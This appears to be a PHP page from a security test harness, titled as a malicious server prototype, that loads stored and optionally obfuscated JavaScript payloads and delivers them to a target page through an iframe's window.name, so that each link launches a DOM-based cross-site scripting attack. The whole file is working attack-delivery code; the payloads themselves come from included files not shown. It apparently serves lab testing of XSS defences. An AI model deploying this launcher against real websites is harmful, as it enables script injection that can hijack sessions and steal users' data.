<?php
include('../declare.php');
include(INCDIR.'payload.php');

$errors = array();

function PrepareScript($testname, $obfu, $subs) {
  if (is_array($subs)) {
    // Keys from the argument will overwrite those from the base array.
    $subs = array_merge(GetBaseSubs(), $subs);
  } else if ($subs) {
    // A truthy value indicates that the base array should be used.
    $subs = GetBaseSubs();
  }
  if (is_string($obfu)) {
    $code = GetObfuscatedPayload($testname, $obfu, $subs);
  } else {
    $code = GetPayload($testname, $subs);
  }
  $code = str_replace(array("'", "\n",  "\r"), array("\\'", '\\n', '\\r'), $code);
  return 'dummy<script>'.$code.'</script>';
}

function PrepareImage($src) {
  $src = str_replace('"', '\\"', $src);
  return '<img src="'.$src.'" />';
}

$attacks = LoadAttacks();

$title = "Malicious server prototype: DOM-based XSS";
include(INCDIR.'header.php');
?>
<script type="text/javascript">
<![CDATA[
var payloads = {
<?
// Output a link for each obfuscation of each payload.
foreach ($attacks as $aname => $attack) {
  $jname = str_replace("'", "\\'", $aname);
?>
  '<?=$jname?>': {  
<?
  foreach ($attack as $ob => $pl) {
    if (strpos($ob, '#') === 0) continue;
    $job = str_replace("'", "\\'", $ob);
    // $pl is already escaped for embedding in single-quotes.
?>
    '<?=$job?>': '<?=$pl?>',
<?
  }
?>
  }, // /<?=$ob?>

<?
}
?>
}; // /payloads

function loadIframe(att, obfu) {
  var frame = document.createElement('iframe');
  frame.width = '400px';
  frame.height = '400px';
  frame.id = 'frame_' + obfu;

  var plsub = payloads[att];
  if (plsub === undefined) {
    alert('Attack not found: ' + att);
    return false;
  }

  frame.name = plsub[obfu];
  frame.src="<?=TGTROOT?>dombased/target";
  
  var embed = document.getElementById('embed');
  var last;
  while (last = embed.lastChild) embed.removeChild(last);

  embed.appendChild(frame);
  return false;
}
]]>
</script>
<h1>DOM-based XSS</h1>
<p class="instructions">
Clicking on the links below will initiate DOM-based XSS attacks on the
target server via an embedding exploit.
</p>
<?
if (sizeof($errors) > 0) {
?>
<p id="errors"><?=implode('<br/>', $errors)?></p>
<?
}
?>
<div id="embed">
</div>
<?
// Output a link for each obfuscation of each payload.
foreach ($attacks as $aname => $attack) {
  $hname = htmlspecialchars($aname);
  $escname = str_replace("'", "\\'", $aname);
?>
<h3 id="<?=$hname?>" ><?=$hname?></h3>
<?
  if (isset($attack['#comment'])) {
?>
<p class="comment"><?=htmlspecialchars($attack['#comment'])?></p>
<?
  }
  $escatt = str_replace("'", '\\"', $aname);
  foreach ($attack as $ob => $pl) {
    if (strpos($ob, '#') === 0) continue;
    $escob = str_replace("'", "\\'", $ob);
    $onclick = "return loadIframe('".$escatt."', '".$escob."');";
    $escoc = str_replace('"', '\\"', $onclick);
?>
| <a href="#" onclick="<?=$escoc?>"><?=htmlspecialchars($ob)?></a>
<?
  }
}

$links = array(
  'dom-based XSS start' => TGTROOT."dombased/start",
);
include(INCDIR.'footer.php');
?>
